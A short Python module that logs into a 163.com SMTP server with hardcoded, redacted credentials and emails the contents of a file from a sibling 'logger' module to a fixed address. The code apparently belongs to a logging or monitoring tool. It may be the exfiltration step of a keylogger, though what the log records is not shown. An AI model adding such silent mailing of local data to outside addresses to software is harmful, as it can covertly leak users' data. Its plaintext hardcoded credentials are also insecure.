import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from .logger import FILENAME
from .logger import FULL_PATH # import logger


def send_log():
    smtp_server = 'smtp.163.com'
    smtp_port = 25
    smtp_username = 'redacted@example.com'
    smtp_password = 'REVOKED_AUTH_CODE'
    smtp_connection = smtplib.SMTP(smtp_server, smtp_port)
    smtp_connection.login(smtp_username, smtp_password)

    log_file_path = FULL_PATH
    
    with open(log_file_path, 'rb') as file:
        log_file_data = file.read()

    message = MIMEText(log_file_data)

    message['From'] = 'redacted@example.com'
    message['To'] = 'redacted@example.com'
    message['Subject'] = 'Log file'

    smtp_connection.sendmail(smtp_username, 'redacted@example.com', message.as_string())
    smtp_connection.quit()
    print ("Email sent successfully")